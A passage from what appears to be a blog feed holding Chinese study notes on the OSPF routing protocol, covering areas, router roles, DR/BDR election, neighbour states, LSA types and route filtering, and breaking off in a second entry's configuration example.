原因：OSPF需要消耗大量的路由器资源</p><p>划分：</p><p>1.骨干域：区域0，必须存在并且唯一，作为OSPF的核心区域，所有的域间、域外路由通过区域0转发，常规区域（非骨干域）间不能传递路由。</p><p>注：严格意义上，骨干域内必须存在邻居关系，否则会有成环的风险。</p><p>2.非骨干域：非0区域，可以存在多个，但必须与骨干域邻接</p><p>3.特殊区域：由非骨干区域而来，在非骨干的区域上的减少lsa传递的数量</p><p>命名：区域id的命令采用整数数字，或IP地址形式</p><h6 id="【五】路由器的角色"><a href="#【五】路由器的角色" class="headerlink" title="【五】路由器的角色"></a>【五】路由器的角色</h6><p>OSPF基于链路划分了骨干域和非骨干域，路由在不同的位置担任不同的角色，起着不同的作用。</p><p>ABR：区域边界路由器，位于骨干域和非骨干域的交接处，可以产生3类LSA，承担与骨干域的LSA交换及域间流量的进出口</p><p>ASBR：自治系统边界路由器，位于OSPF网络与其它网络的交接处，可以产生5类、7类LSA，承担与其它的网络的通信及将其它网络的路由信息引入的作用。</p><h6 id="【六】虚电路"><a href="#【六】虚电路" class="headerlink" title="【六】虚电路"></a>【六】虚电路</h6><p>作用：</p><p>1、解决骨干域断裂的问题</p><p>2、解决不规则区域问题</p><h6 id="【七】DR-BDR选举"><a href="#【七】DR-BDR选举" class="headerlink" title="【七】DR/BDR选举"></a>【七】DR/BDR选举</h6><p>在MA网络中，如果每个接口之间都建立邻接关系，那么将导致重复更新，OSPF是链路状态协议，没有接口的水平分割，所以需要指定一个主路由器，负责和其它设备交换信息</p><p>DR：主路由器</p><p>BDR：备份路由器</p><p>选举规则：</p><p>1、比较接口优先级-大优</p><p>P2P网络中接口的优先级为0，不参与选举，因此可将DRouter的接口优先级修改为0，DRouther和DR建立邻接关系，DRouther之间建立邻居关系，即Two-way状态</p><h6 id="【八】网络类型"><a href="#【八】网络类型" class="headerlink" title="【八】网络类型"></a>【八】网络类型</h6><p>判断网络类型，是基于设备接口的二层封装技术来进行的</p><p>1、P2P：点到点通信网络，二层封装为ppp或hdlc，没有物理寻址，不需要选举DR/DBR，支持广播（PPP）</p><p>2、MA：多路访问 ，在一个网段内的节点数量不限制，支持广播，自动选举DR/BDR（以太网）</p><p>3、NBMA：非广播型多路技术，在一个MA网络中没有广播机制，需要手动指定邻居，不支持伪广播</p><p>广播：广播是发送一个报文，该报文在广播域内传递给所有设备</p><p>伪广播：通过单播的形式给每一个设备发送一个报文</p><p>4、MP：分支之间不能直接通信，需要绕行总部</p><h4 id="二、OSPF报文及工作方式"><a href="#二、OSPF报文及工作方式" class="headerlink" title="二、OSPF报文及工作方式"></a>二、OSPF报文及工作方式</h4><h5 id="2-1-OSPF报文及作用"><a href="#2-1-OSPF报文及作用" class="headerlink" title="2.1 OSPF报文及作用"></a>2.1 OSPF报文及作用</h5><p>【1】hello报文</p><p>建立和维护邻居关系</p><p>【2】数据库描述包-DBD</p><p>携带LSA目录，比对LSA信息，通过LSA头部的三个信息可以区别不同的LSA</p><p>~LS Type</p><p>~Link State ID</p><p>~advertising Router</p><p>【3】链路状态请求报文-LSR</p><p>向路由器请求特定的LSA</p><p>【4】链路状态更新报文-LSU</p><p>向请求的路由器发送LSA</p><p>【5】链路状态确认报文-LSACK</p><p>路由器收到LSA恢复确认</p><p>注：由于IP是无连接不可靠的协议，因此报文的发送需要确认，OSPF报文中除hello报文外，其它报文都需要确认</p><p>​        DBD-序列号隐式确认</p><p>LSR-LSU</p><p>LSU-LSACK</p><h5 id="2-2-OSPF工作方式"><a href="#2-2-OSPF工作方式" class="headerlink" title="2.2 OSPF工作方式"></a>2.2 OSPF工作方式</h5><p>Down → Init → Two-way → Exstart → Exchange → Loading → Full</p><h6 id="【一】OSPF邻接状态建立"><a href="#【一】OSPF邻接状态建立" class="headerlink" title="【一】OSPF邻接状态建立"></a>【一】OSPF邻接状态建立</h6><p>1、Down：启动状态</p><p>OSPF进程刚运行时，路由器没有收到任何数据包，路由器开始发送hello包。</p><p>hello包以组播的方式发送，组播地址：224.0.0.5，hello time：10s/dead time 40s</p><p>在非广播网络中，不能广播发送hello包，需要手工指定邻居，发送单播hello，进入Attempt状态。</p><p>2、Init：初始化状态</p><p>路由器收到hello包后进入该状态，并将收到hello包的Router-id加入到自己发送hello包的邻居列表中</p><p>3、Two-way：双向通信状态</p><p>路由器收到的hello包的邻居列表中包含自己的Router-id，则进入该状态，代表邻居关系建立，建立邻居表，将邻居的Router-id加表</p><p>P2P网络：进入下一状态</p><p>MA：选举DR/BDR，组播地址：224.0.0.6</p><p>4、Exstart：预启动状态</p><p>双方邻居关系建立完成以后，通过类hello包的DBD对比，选举主从设备-Master—Slave。主路由器定义DBD序列号，通过序列号的隐式确认，保证传输可靠性</p><p>注：如果双方MTU不同，则停在该状态</p><p>选举规则：</p><p>Router-id较大的成为Master</p><p>5、Exchange：准交换状态</p><p>双方开始发送DBD数据包，对比LSA信息，确定自己需要的LSA信息</p><p>6、Loading：加载状态</p><p>使用LSR/LSU/LSack来获取未知的LSA信息</p><p>lsr–请求列表-针对每一条发送lsu</p><p>lsu–重传列表-对方收到lsu后发送ack确认，如果没收到，则重发</p><p>7、full：准发状态</p><p>LSA发送完毕，链路状态数据库收敛完毕</p><p>##### </p><p>附加：Attempt状态：出现在NBMA网络中，NBMA网络没有广播，所以需要手动指定邻居</p><h6 id="【二】OSPF的三张表"><a href="#【二】OSPF的三张表" class="headerlink" title="【二】OSPF的三张表"></a>【二】OSPF的三张表</h6><p>1、邻居表-peer</p><p>路由器在各个激活的OSPF的接口上维护的邻居都列在邻居表中，在邻居关系建立后，将邻居的Router-id加入邻居表中</p><p>作用：描述与OSPF建立邻居的路由器及其状态</p><p>2、链路状态数据库-LSDB</p><p>存储LSA的信息，可以将自己产生及邻居通告的LSA存储在LSDB中，用于计算网络拓扑和生成路由条目，是OSPF运行SPF算法的基础数据</p><p>作用：收集LSA的信息，用于SPF算法计算</p><p>3、OSPF路由表-Routing</p><p>SPF算法对LSDB计算，得到最佳路径，并生成OSPF路由表</p><p>作用：提供前往目的网段的最佳路径</p><h6 id="【三】OSPF邻居关系建立条件"><a href="#【三】OSPF邻居关系建立条件" class="headerlink" title="【三】OSPF邻居关系建立条件"></a>【三】OSPF邻居关系建立条件</h6><p>1.router-ID必须不同    </p><p>2.area-ID必须一致</p><p>3.认证类型和认证型数据都一致   </p><p>4.hello时间、dead时间都一致  </p><p>5.特殊区域标识必须一致  </p><p>6.若在MA网络中，network mask必须一致</p><p>7.必须同时使用单播或组播</p><h6 id="【四】OSPF各状态停止原因"><a href="#【四】OSPF各状态停止原因" class="headerlink" title="【四】OSPF各状态停止原因"></a>【四】OSPF各状态停止原因</h6><p>1、卡在down状态：OSPF没有运行</p><p>2、卡在init状态：没有收到对方的包</p><p>3、卡在2-way状态：MA网络没法选举</p><p>4、卡在exstart状态：MTU不匹配</p><p>5、卡在exchange状态：包交互有问题，发出DBD后没有收到ACK</p><p>6、卡在loading状态：LSA加载不完全、包交互有问题</p><h5 id="2-3-OSPF的收敛"><a href="#2-3-OSPF的收敛" class="headerlink" title="2.3 OSPF的收敛"></a>2.3 OSPF的收敛</h5><h6 id="【一】快速收敛"><a href="#【一】快速收敛" class="headerlink" title="【一】快速收敛"></a>【一】快速收敛</h6><p>1、增量最短路径优先算法I-SPF</p><p>第一次计算全部节点，降低了CPU的占用率，提高网络的收敛速度</p><p>2、部分路由计算PRC</p><p>只对受影响的路由计算</p><p>3、智能定时器</p><p>对接口翻滚等带来的接口不稳定，进行智能控制，减少LSA洪泛</p><p>初次计算SPF的间隔时间由start-interval参数决定，第n&gt;2次计算SPF时间为hold-interval*2（n-1）,当hold到达指定最长时间max-interval时，OSPF计算SPF的时间间隔都是最长时间间隔</p><h6 id="【二】按优先级收敛"><a href="#【二】按优先级收敛" class="headerlink" title="【二】按优先级收敛"></a>【二】按优先级收敛</h6><p>1、特定路由优先收敛的技术</p><p>可以通过前缀列表将指定路由过滤出来，通过不同的路由配置不同的收敛优先级，达到重要路由先收敛，提高网络可靠性</p><h6 id="【三】触发更新"><a href="#【三】触发更新" class="headerlink" title="【三】触发更新"></a>【三】触发更新</h6><p>1、路由器注意到一个链路状态改变了，他会使用组播地址224.0.0.6向ospf dr和bdr发送LSU包，此包中包含LSA更新信息。</p><h4 id="三、OSPF的LSA"><a href="#三、OSPF的LSA" class="headerlink" title="三、OSPF的LSA"></a>三、OSPF的LSA</h4><h5 id="3-1-LSA介绍"><a href="#3-1-LSA介绍" class="headerlink" title="3.1 LSA介绍"></a>3.1 LSA介绍</h5><table><thead><tr><th>LSA</th><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>Router-LSA</td><td>Type-1</td><td>每个设备都会产生，描述了设备的链路状态和开销，在所在区域传输</td></tr><tr><td>Network-LSA</td><td>Type-2</td><td>由DR产生，描述网段的链路状态，在所属区域产生，是对1类的补充</td></tr><tr><td>Network-summary-LSA</td><td>Type-3</td><td>由ABR产生，描述区域内的网段 ，为域间路由服务</td></tr><tr><td>ASBR-summary-LSA</td><td>Type-4</td><td>由ABR产生描述到ASBR的路由，通告给非ASBR所在区域，是对5类的补充</td></tr><tr><td>AS-external-LSA</td><td>Type-5</td><td>由ASBR产生，描述AS外部的路由，通告到所有区域</td></tr><tr><td>NSSA-LSA</td><td>Type-7</td><td>由ASBR产生，描述AS外部的路由，只在NSSA区域传播</td></tr><tr><td>Opaque LSA</td><td>Type-9/Type-10/Type-11</td><td>9在网段内传播，10支持TE，11无</td></tr></tbody></table><h5 id="3-2-LSA更新"><a href="#3-2-LSA更新" class="headerlink" title="3.2 LSA更新"></a>3.2 LSA更新</h5><p>正常1800s更新一次，最大老化时间是3609s</p><h6 id="【1】LSA的新旧比较"><a href="#【1】LSA的新旧比较" class="headerlink" title="【1】LSA的新旧比较"></a>【1】LSA的新旧比较</h6><p>1、会先比较序列号，序列号越大越优，</p><p>2、如果序列号相同，会比较校验值（checksum)越大越优</p><p>3、如果校验值也相同，会比较LSA Age时间，是否等于MAX-age时间（3600）</p><p>4、如果age时间不等于max-age时间，会比较他们的差值，如果差值大15分钟（900秒），小的优</p><p>5、如果age时间不等于max-age时间，会比较他们的差值，如果差值小于15分钟，说明是同一条LSA，忽略其中一条</p><h6 id="【2】LSA更新时间"><a href="#【2】LSA更新时间" class="headerlink" title="【2】LSA更新时间"></a>【2】LSA更新时间</h6><p>1、周期更新-1800s</p><p>2、触发更新</p><h5 id="3-3-LSA优化"><a href="#3-3-LSA优化" class="headerlink" title="3.3 LSA优化"></a>3.3 LSA优化</h5><h6 id="【1】汇总"><a href="#【1】汇总" class="headerlink" title="【1】汇总"></a>【1】汇总</h6><p>1）域间路由汇总—将非骨干区域汇总到骨干区域</p><p>将3类LSA汇总，减少更新量</p><p>2）域外路由汇总—将外部路由汇总为一条导入到OSPF中</p><p>将5类LSA汇总，减少更新量</p><h6 id="【2】特殊区域"><a href="#【2】特殊区域" class="headerlink" title="【2】特殊区域"></a>【2】特殊区域</h6><p>不能是骨干区域，不能存在虚电路</p><p>一、不存在ASBR</p><p>1、末梢区域 stub   </p><p>​      拒绝4/5类的LSA，生成一条3类的缺省指向骨干区域</p><p>2、完全末梢区域  Totally stub area</p><p>​     拒绝3/4/5类lsa，仅保留一条3类的缺省</p><p>二、存在ASBR</p><p>1、Not-So-Stubby Area  非完全末梢区域  </p><p>​     拒绝其他区域的ASBR产生的4/5类LSA，本地区域内ASBR产生的5类LSA，以7类在本区域传播，从本区域进入骨干区域时由ABR（新的ASBR）转换为5类，同时自动产生一条7的缺省指向骨干区域</p><p>2、 Totally  Not-So-Stubby Area</p><p>​     在NSSA的基础上，进一步拒绝3类LSA，生成一条3类缺省指向骨干区域</p><h6 id="【3】缺省路由"><a href="#【3】缺省路由" class="headerlink" title="【3】缺省路由"></a>【3】缺省路由</h6><p>普通区域：</p><p>ASBR上手动配置产生缺省5类，通告到OSPF自治区域外（特殊区域除外）</p><p>STub区域：</p><p>ABR自动产生一条缺省3类LSA，通告到整个Stub区域内</p><p>Totally Stub区域：</p><p>ABR会自动产生一条缺省3类LSA，通告到整个Stub区域内</p><p>NSSA区域：</p><p>ABR自动产生一条缺省LSA，通告到整个NSSA区域内</p><p>ASBR手动配置产生一条缺省7类LSA，通告到整个NSSA区域内</p><p>Totally NSSA区域：</p><p>ABR自动产生一条缺省3类LSA，通告到整个NSSA区域内</p><h4 id="四、OSPF选路及不规则区域"><a href="#四、OSPF选路及不规则区域" class="headerlink" title="四、OSPF选路及不规则区域"></a>四、OSPF选路及不规则区域</h4><h5 id="4-1-OSPF选路"><a href="#4-1-OSPF选路" class="headerlink" title="4.1 OSPF选路"></a>4.1 OSPF选路</h5><p>1、拓扑优于路由   1/2LSA计算所得路由优于3/4/5/7类计算所得</p><p>2、内部优于外部   3类优于4/5/7类</p><p>3、AS区域内和区域间描述的是AS内部的结构，AS外部路由则描述的是AS以外的目的地址的路由</p><p>OSPF将引入AS外部的路由分为Type1和Type2两类</p><p>Type1：</p><p>到第一类外部路由的开销=本设备到相应的ASBR的开销+ASBR到目的网络的开销</p><p>Type2：</p><p>到第二类外部路由的开销=ASBR到目的网络的开销</p><h5 id="4-2-不规则区域解决方法"><a href="#4-2-不规则区域解决方法" class="headerlink" title="4.2 不规则区域解决方法"></a>4.2 不规则区域解决方法</h5><h6 id="【一】tunnel-隧道"><a href="#【一】tunnel-隧道" class="headerlink" title="【一】tunnel 隧道"></a>【一】tunnel 隧道</h6><p>在两台的ABR上建立tunnel，然后将其宣告到OSPF协议中</p><p>缺点：</p><p>1、周期和触发的信息将对中间的穿越区域造成资源的占用；</p><p>2、选路不佳</p><h6 id="【二】虚电路"><a href="#【二】虚电路" class="headerlink" title="【二】虚电路"></a>【二】虚电路</h6><p>网络中合法的ABR（工作的区域0的ABR），和非法ABR间建立一条虚链路（在OSPF协议中构建，没有新生网段）   由合法ABR授权非法ABR进行区域间路由共享</p><p>优点：</p><p>没有新生链路，故选路正常    </p><p>缺点：</p><p>设备中依然保留周期的hello包和更新—-占用中间区域资源</p><h6 id="【三】OSPF多进程双向重发布"><a href="#【三】OSPF多进程双向重发布" class="headerlink" title="【三】OSPF多进程双向重发布"></a>【三】OSPF多进程双向重发布</h6><p>OSPF多进程，进程号仅具有本地意义，邻居间建立邻居关系时可以使用不同的进程号；</p><p>若在一台设备上同时启动多个进程，那么不同进程存在自己的邻居关系，生成不同的数据库（不共享）；</p><p>最终将所有数据库计算所得路由加载于同一张路由表中；</p><p>在解决不规则区域时，可以让非法ABR将不同的OSPF区域工作在不同的OSPF进程中，之后使用双向重发布技术来实现路由共享</p><h5 id="4-3-OSPF防环"><a href="#4-3-OSPF防环" class="headerlink" title="4.3 OSPF防环"></a>4.3 OSPF防环</h5><h6 id="【一】区域内防环"><a href="#【一】区域内防环" class="headerlink" title="【一】区域内防环"></a>【一】区域内防环</h6><p>域内会有两种LSA-Router和Network，LSDB通过描述一个有向线段图来描述网络拓扑结构</p><p>机制：路由器以自己为根构造最短路径树</p><p>1、仅考虑路由器和传输网络之间的传输</p><p>2、末节网络作为叶子加入树</p><p>总结：构造最短路径树</p><h6 id="【二】区域间放环"><a href="#【二】区域间放环" class="headerlink" title="【二】区域间放环"></a>【二】区域间放环</h6><p>1) OSPF要求所有的非0区域必须与骨干区域直接相连，区域间路由需经由骨干区域中转。</p><p>2）因此当一台ABR在非Area0的区域中收到Type-3 LSA时，虽然它会将其装载进LSDB，但是该 路由器不会使用这些Type-3 LSA进行路由计算，当然它更不会将这些Type-3 LSA再注入回Area0中。 </p><p>3) ABR不会将描述一个Area内部的路由信息的Type-3 LSA再注入回该区域中。 </p><p>总结：区域间水平分割</p><h6 id="【三】区域外放环"><a href="#【三】区域外放环" class="headerlink" title="【三】区域外放环"></a>【三】区域外放环</h6><p>Type-5 LSA将会被泛洪到整个OSPF域，表面上看，它本身并不具有什么防环的能力，但是实际上，它并不需要，因为它可以依赖Type-1 LSA及Type-4 LSA来实现防环。</p><p>总结：依赖4类LSA放环</p><h5 id="4-4-路由过滤"><a href="#4-4-路由过滤" class="headerlink" title="4.4 路由过滤"></a>4.4 路由过滤</h5><p>OSPF可以使用路由策略包括route-policy、filter、filter-policy，filter-lsa-out，access-list，prefix-list</p><h6 id="【1】路由引入过滤"><a href="#【1】路由引入过滤" class="headerlink" title="【1】路由引入过滤"></a>【1】路由引入过滤</h6><p>在重发布时配置策略</p><h6 id="【2】3类LSA学习、发布过滤"><a href="#【2】3类LSA学习、发布过滤" class="headerlink" title="【2】3类LSA学习、发布过滤"></a>【2】3类LSA学习、发布过滤</h6><p>Filter inport、filter export在ABR上对进入离开本区域的3类LSA过滤</p><h6 id="【3】5类、7类LSA生成过滤"><a href="#【3】5类、7类LSA生成过滤" class="headerlink" title="【3】5类、7类LSA生成过滤"></a>【3】5类、7类LSA生成过滤</h6><p>Filter-policy export 对5、7类LSA过滤</p><h6 id="【4】接口视图下的lsa过滤"><a href="#【4】接口视图下的lsa过滤" class="headerlink" title="【4】接口视图下的lsa过滤"></a>【4】接口视图下的lsa过滤</h6><p>通过OSPF filter-LSA-out，匹配除Grace LSA外的所有LSA、3、5、7类LSA，并匹配ACL规定的路由前缀时</p><h6 id="【5】路由计算过滤"><a href="#【5】路由计算过滤" class="headerlink" title="【5】路由计算过滤"></a>【5】路由计算过滤</h6><p>通过filter-policy import过滤规则，可以设置OSPF数据库中的域内、域间、域外LSA计算为路由条目时进行过滤</p><h4 id="五、OSPF其它特点"><a href="#五、OSPF其它特点" class="headerlink" title="五、OSPF其它特点"></a>五、OSPF其它特点</h4><h5 id="5-1-路由类型"><a href="#5-1-路由类型" class="headerlink" title="5.1 路由类型"></a>5.1 路由类型</h5><p>AS区域内和区域间描述的是AS内部的结构，AS外部路由则描述的是AS以外的目的地址的路由</p><p>OSPF将引入AS外部的路由分为Type1和Type2两类</p><p>Type1：</p><p>到第一类外部路由的开销=本设备到相应的ASBR的开销+ASBR到目的网络的开销</p><p>Type2：</p><p>到第二类外部路由的开销=ASBR到目的网络的开销</p><h5 id="5-2-OSPF路由优先级"><a href="#5-2-OSPF路由优先级" class="headerlink" title="5.2 OSPF路由优先级"></a>5.2 OSPF路由优先级</h5><p>1、域内：10   域外：150   （RIP 100  ISIS  15  静态 60 Eigrp 80 BGP 255）</p><p>内部路由优先级要小于其他IGP路由协议</p><p>外部路由优先级要大于其他IGP路由协议</p><p>外部路由大于内部路由会给路由协议带来水平分割保护机制</p><h5 id="5-3-附录E"><a href="#5-3-附录E" class="headerlink" title="5.3 附录E"></a>5.3 附录E</h5><p>附录E — link-id相同的问题</p><p>若一台ABR将两条3类LSA导入其他区域；同时这两条LSA的link-id会相同；</p><p>假设：短掩码网段先进入，link-id正常显示；长掩码进入时link-id加反掩码</p><p>20.1.0.0/16–link-id  20.1.0.0   </p><p>20.1.0.0/24–link-id  20.1.0.255   </p><p>若长掩码先进入，再短掩码进入时，长掩码的信息被刷新为反掩码；</p><p>link-id相同时，短掩码正常显示，长掩码加反掩码</p><h5 id="5-4-sham-LINk"><a href="#5-4-sham-LINk" class="headerlink" title="5.4 sham-LINk"></a>5.4 sham-LINk</h5><p>背景：在MPLS-BGP网络中，由于ospf网络之间还有备份网络，回导致路由优先选择备份路径，原因是OSPF的选路规则，域间或域内大于域外</p><p>原理:通过两个可以在PE的vr中通信的回环地址,让俩个PE建立ospf的邻居关系,从而不再依赖bgp的vpnv4来传递俩个PE之间的ospf路由。shame-link的建立是的俩个站点之间的ospf拓扑由</p><p>CE1（OSPF_PE1（OSPF-PE1）-<em>PE2（BGP）-</em>PE2（OSPF）-CE2（OSPF）</p><p>到1</p><p>CE1 (OSPF)——&gt; PE1 (OSPF） &gt; PE2 (OSPF) - &gt; CE2 (OSPF)</p><h5 id="5-5-Option字段"><a href="#5-5-Option字段" class="headerlink" title="5.5. Option字段"></a>5.5. Option字段</h5><p>Option字段：</p><p>DN-用来避免在MPLS-VPN中环路，当PE向CE发送3类、5类、7类LSA时，需要设置DN位，其他PE收到该LSA时，不能用于计算</p><p>N/P-对7类LSA的控制，N=1表示，支持接受7类LSA，N=0表示不支持，P位告诉ABR将7类转为5类</p><p>E-支持接受外部LSA，可以接受5类LSA时，该位置位</p><p>MT-支持多拓扑OSPF</p><h5 id="5-5-Database-Overflow"><a href="#5-5-Database-Overflow" class="headerlink" title="5.5 Database Overflow"></a>5.5 Database Overflow</h5><p>通过设置路由器上非缺省外部路由数量的上限，来避免数据库超限，OSPF网络中所有的路由器都必须配置相同的上限值</p><p>OSPF Datebase Overflow过程：</p><p>1、进入该状态，删除自己产生的非缺省外部路由</p><p>2、处于该状态中时，不产生非缺省外部路由，丢弃新收到的外部路由并不回复确认报文，如果超限状态定时器超时（5s），检查外部路由数量是否仍然超限，如果超限则重启定时器，没有则退出</p><p>3、退出该状态时，路由器删除定时器，产生非缺省外部路由，接受新收到的非缺省外部路由并回复确认报文</p><h5 id="5-6-FA地址"><a href="#5-6-FA地址" class="headerlink" title="5.6 FA地址"></a>5.6 FA地址</h5><p>FA地址是5、7类LSA特有的</p><p>在OSPF引入外部路由时，若产生的五类LSA的FA地址为0.0.0.0，则其他路由器在计算到达该外部网络时，将考虑如何到达ASBR来计算出外部路由的下一跳地址</p><p>在OSPF引入外部路由时，若产生的五类LSA的FA地址不为0.0.0.0，则其他路由器在计算到达该外部网络时，将考虑如何到达该FA地址来计算出外部路由的下一跳地址</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;OSPF（open shortest path Fist0）是IETF组织开发的一个基于链路状态的内部网关协议，具有收敛快、路由无环、可扩展等优点。&lt;/p&gt;
    
    </summary>
    
      <category term="路由与交换" scheme="http://soliym.top/categories/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2/"/>
    
    
      <category term="路由协议" scheme="http://soliym.top/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>OSPF开放最短路径优先协议简述</title>
    <link href="http://soliym.top/2021/06/19/OSPF%E5%BC%80%E6%94%BE%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E4%BC%98%E5%85%88%E5%8D%8F%E8%AE%AE%E7%AE%80%E8%BF%B0/"/>
    <id>http://soliym.top/2021/06/19/OSPF开放最短路径优先协议简述/</id>
    <published>2021-06-19T14:37:20.983Z</published>
    <updated>2019-09-02T09:12:08.008Z</updated>
    
    <content type="html"><![CDATA[<h5 id="一、开放式最短路径优先协议"><a href="#一、开放式最短路径优先协议" class="headerlink" title="一、开放式最短路径优先协议"></a>一、开放式最短路径优先协议</h5><p> OSPF(Open Shortest Path First)是一个内部网关协议(Interior Gateway Protocol,简称IGP)。与RIP相对，OSPF是链路状态路由协议，而RIP是距离向量路由协议。链路是路由器接口的另一种说法，因此OSPF也称为接口状态路由协议。OSPF通过路由器之间通告网络接口的状态来建立链路状态数据库，生成最短路径树，每个OSPF路由器使用这些最短路径构造路由表。</p><a id="more"></a><p>OSPFv2用于ipv4网络，OSPFv3用在ipv6网络。可用于大型网络。</p><h5 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念"></a>二、基本概念</h5><p><strong>链路状态</strong></p><p>OSPF路由器收集其所在网络区域上各路由器的连接状态信息，即链路状态信息（Link-State），生成链路状态数据库(Link-State Database)。路由器掌握了该区域上所有路由器的链路状态信息，也就等于了解了整个网络的拓扑状况。OSPF路由器利用“最短路径优先算法(Shortest Path First, SPF)”，独立地计算出到达任意目的地的路由。</p><p><strong>区域</strong></p><p>OSPF协议引入“分层路由”的概念，将网络分割成一个“主干”连接的一组相互独立的部分，这些相互独立的部分被称为“区域”(Area)，“主干”的部分称为“主干区域”。每个区域就如同一个独立的网络，该区域的OSPF路由器只保存该区域的链路状态。每个路由器的链路状态数据库都可以保持合理的大小，路由计算的时间、报文数量都不会过大。</p><p><strong>共有五种区域的主要区别在于它们和外部路由器间的关系：</strong></p><p><strong>标准区域</strong>: 一个标准区域可以接收链路更新信息和路由总结。</p><p><strong>主干区域</strong>(传递区域):主干区域是连接各个区域的中心实体。主干区域始终是“区域0”，所有其他的区域都要连接到这个区域上交换路由信息。主干区域拥有标准区域的所有性质。</p><p><strong>存根区域</strong>（stub Area）：存根区域是不接受自治系统以外的路由信息的区域。如果需要自治系统以外的路由，它使用默认路由0.0.0.0。</p><p><strong>完全存根区域</strong>：它不接受外部自治系统的路由以及自治系统内其他区域的路由总结。需要发送到区域外的报文则使用默认路由：0.0.0.0。完全存根区域是Cisco自己定义的。 </p><p><strong>不完全存根区域**</strong>(NSAA)**: 它类似于存根区域，但是允许接收以LSA Type 7发送的外部路由信息，并且要把LSA Type 7转换成LSA Type 5。</p><p>OSPF中的四种路由器</p><p>在OSPF多区域网络中，路由器可以按不同的需要同时成为以下四种路由器中的几种： </p><p>\1. 内部路由器：所有端口在同一区域的路由器，维护一个链路状态数据库。 </p><p>\2. 主干路由器：具有连接主干区域端口的路由器。 </p><p>\3. 区域边界路由器(ABR)：具有连接多区域端口的路由器，一般作为一个区域的出口。ABR为每一个所连接的区域建立链路状态数据库，负责将所连接区域的路由摘要信息发送到主干区域，而主干区域上的ABR则负责将这些信息发送到各个区域。 </p><p>\4. 自治域系统边界路由器(ASBR)：至少拥有一个连接外部自治域网络（如非OSPF的网络）端口的路由器，负责将非OSPF网络信息传入OSPF网络。</p><p>OSPF路由器之间交换链路状态公告(LSA)信息。OSPF的LSA中包含连接的接口、使用的Metric及其他变量信息。OSPF路由器收集链接状态信息并使用SPF算法来计算到各节点的最短路径。</p><p><strong>协议类型</strong></p><p>Hello报文，通过周期性地发送来发现和维护邻接关系；     </p><p>​            存在router ID—-RID 全网唯一的编号，使用ip地址</p><p>DBD(链路状态数据库描述)报文，描述本地路由器保存的LSDB(链路状态数据库)；</p><p>LSR(LS Request)报文，向邻居请求本地没有的LSA；</p><p>LSU(LS Update)报文，向邻居发送其请求或更新的LSA；</p><p>LSAck(LS ACK)报文，收到邻居发送的LSA后发送的确认报文。</p><p>OSPF网络类型</p><p>根据路由器所连接的物理网络不同，OSPF将网络划分为四种类型：广播多路访问型（Broadcast multiAccess）、非广播多路访问型（None Broadcast MultiAccess，NBMA）、点到点型（Point-to-Point）、点到多点型（Point-to-MultiPoint）。 </p><p>指派路由器（DR）和备份指派路由器（BDR）</p><p>在多路访问网络上可能存在多个路由器，为了避免路由器之间建立完全相邻关系而引起的大量开销，OSPF要求在区域中选举一个DR。每个路由器都与之建立完全相邻关系。DR负责收集所有的链路状态信息，并发布给其他路由器。选举DR的同时也选举出一个BDR，在DR失效的时候，BDR担负起DR的职责。 </p><p>点对点型网络不需要DR，因为只存在两个节点，彼此间完全相邻。 协议组成OSPF协议由Hello协议、交换协议、扩散协议组成。</p><p>当路由器开启一个端口的OSPF路由时，将会从这个端口发出一个Hello报文，以后它也将以一定的间隔周期性地发送Hello报文。OSPF路由器用Hello报文来初始化新的相邻关系以及确认相邻的路由器邻居之间的通信状态。 </p><p>对广播型网络和非广播型多路访问网络，路由器使用Hello协议选举出一个DR。在广播型网络里，Hello报文使用多播地址224.0.0.5周期性广播，并通过这个过程自动发现路由器邻居。在MA网络中，DR负责向其他路由器逐一发送Hello报文。</p><h5 id="三、工作原理"><a href="#三、工作原理" class="headerlink" title="三、工作原理"></a>三、工作原理</h5><p>一般用于同一个路由域内。在这里，路由域是指一个自治系统（Autonomous System），即AS，它是指一组通过统一的路由政策或路由协议互相交换路由信息的网络。在这个AS中，所有的OSPF路由器都维护一个相同的描述这个AS结构的数据库，该数据库中存放的是路由域中相应链路的状态信息，OSPF路由器正是通过这个数据库计算出其OSPF路由表的。</p><h5 id="四、工作工程"><a href="#四、工作工程" class="headerlink" title="四、工作工程"></a>四、工作工程</h5><h6 id="1、数据包"><a href="#1、数据包" class="headerlink" title="1、数据包"></a>1、数据包</h6><p>5种基本数据包</p><p>HELLO—邻居的发现、建立、保活</p><p>DBD—–数据库描述包—数据库目录信息</p><p>LSR—–链路状态请求</p><p>LSU—–链路状态更新—携带各种LSA</p><p>LSACK—链路状态确认</p><h5 id="2、OSPF的状态机–描述接口状态"><a href="#2、OSPF的状态机–描述接口状态" class="headerlink" title="2、OSPF的状态机–描述接口状态"></a>2、OSPF的状态机–描述接口状态</h5><p>Down：本地一旦发出hello包，进入下一状态</p><p>Init–初始化：本地接收到的hello包中若存在本地的RID，进入下一状态</p><p>2way–双向通信：邻居关系建立的标志</p><p>条件匹配：点到点网络直接进入下一个状态；MA网络将进行DR/BDR选举（40s），非DR/BDR间不能进入下一个状态；</p><p>Exstart–预启动：使用类hello的BDB包进行主从关系选举，RID数值大为主，主从优先进入下一个状态。</p><p>Exchange–准交换：使用真正的BDB进行数据库目录的共享，需要ACK；</p><p>LOding–加载：使用LSR/LSU/LSack来获取未知的LSA信息；</p><p>Full–转发：邻接关系建立的标志；</p><h6 id="3、工作过程"><a href="#3、工作过程" class="headerlink" title="3、工作过程"></a>3、工作过程</h6><p>1、启动配置完成后，本地收发hello包，建立邻居关系，生成邻居表；</p><p>2、再进行条件的匹配，匹配失败将停留于邻居关系，仅hello包保活即可；</p><p>3、匹配成功者之间建立邻接关系，需要DBD共享数据库目录，LSR/LSU/LSack来获取未知的LSA信息，当收集完网络中所有的LSA后，生成数据表–LSDB</p><p>4、LSDB建立完成后，本地基于OSPF选路规则，计算本地到达所有未知网段的最短路径，然后将其加载到路由表中，完成收敛。</p><p>5、收敛完成后–hello包周期保活–30分钟周期的BDB比对，若不一致将会使用LSR/LSU/LSack重新获取</p><h6 id="4、配置"><a href="#4、配置" class="headerlink" title="4、配置"></a>4、配置</h6><p>配置</p><p>R1(config)#router ospf 100                    创建/进入OSPF进程100</p><p>R1(config-router)#router-id 